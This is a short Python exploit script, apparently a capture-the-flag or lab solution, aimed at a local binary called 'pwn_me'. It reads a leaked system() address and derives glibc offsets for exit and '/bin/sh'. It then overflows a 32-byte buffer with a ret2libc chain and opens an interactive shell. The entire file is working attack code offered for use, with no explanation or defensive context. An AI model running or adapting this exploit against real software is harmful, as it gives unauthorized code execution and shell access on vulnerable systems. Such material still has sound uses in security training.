import struct
import pexpect
import time

in_gdb = False

padding = 32

# Calc offsets from glibc addresses
syst_a = 0x0003a950
bin_sh_a = 0x0015910b
exit_a = 0x0002e7c0

bin_sh_offset = bin_sh_a - syst_a
exit_offset = exit_a - syst_a

# Spawn process and retrieve system address
if in_gdb:
	proc = pexpect.spawn('gdb ./pwn_me')
	proc.expect(b'(gdb)')
	proc.sendline(b'r')
	proc.expect("Binexgod")
else :
	proc = pexpect.spawn('./pwn_me')
proc.expect(b'\n')
proc.expect(b'\n')
output = proc.before.strip()
real_system_addr = int(output.split(b'0x')[-1],16)

syst_a = real_system_addr
bin_sh_a = syst_a + bin_sh_offset
exit_a = syst_a + exit_offset

print(output.decode(), '\n')
print("system address : ", hex(syst_a))
print("Exit address : ", hex(exit_a))
print("/bin/sh address : ", hex(bin_sh_a))

syst_a = struct.pack("<I", syst_a)
bin_sh_a = struct.pack("<I", bin_sh_a)
exit_a = struct.pack("<I", exit_a)

buff = b"A" * padding
buff += syst_a
buff += exit_a
buff += bin_sh_a

proc.sendline(buff)

#time.sleep(2)
proc.interact()


